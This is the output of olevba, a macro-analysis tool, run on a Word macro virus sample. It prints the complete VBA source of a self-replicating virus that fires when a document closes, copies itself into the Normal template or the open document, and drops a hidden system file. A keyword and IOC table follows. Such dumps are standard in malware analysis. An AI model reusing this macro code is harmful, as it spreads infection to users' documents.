olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tech
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tech - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO polyeng.bas 
in file: Virus.MSWord.Tech - OLE stream: 'Macros/VBA/polyeng'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
' [WM97.polyeng.a]
' by -KD- / Metaphase VX Team & NoMercyVirusTeam
' Tech used from Mr.Vic & 29/A special thanks
' This Macro Virii was made Undernet #virus's big-e polymorphic engine contest.
' It is SR1 compatable useing import/export.
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents("polyeng").Export "c:\windows\poly.dll"
 For Z = 1 To NormalTemplate.VBProject.VBComponents.Count
 If NormalTemplate.VBProject.VBComponents(Z).Name = "polyeng" Then NormInstall = True
 Next Z
 For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
 If ActiveDocument.VBProject.VBComponents(Z).Name = "polyeng" Then ActivInstall = True
 Next Z
If ActivInstall = True And NormInstall = False Then Set VX = NormalTemplate.VBProject _
Else If ActivInstall = False And NormInstall = True Then Set VX = ActiveDocument.VBProject
VX.VBComponents.Import ("c:\windows\poly.dll")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
SetAttr ("c:\windows\poly.dll"), vbHidden + vbSystem
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |poly.dll            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

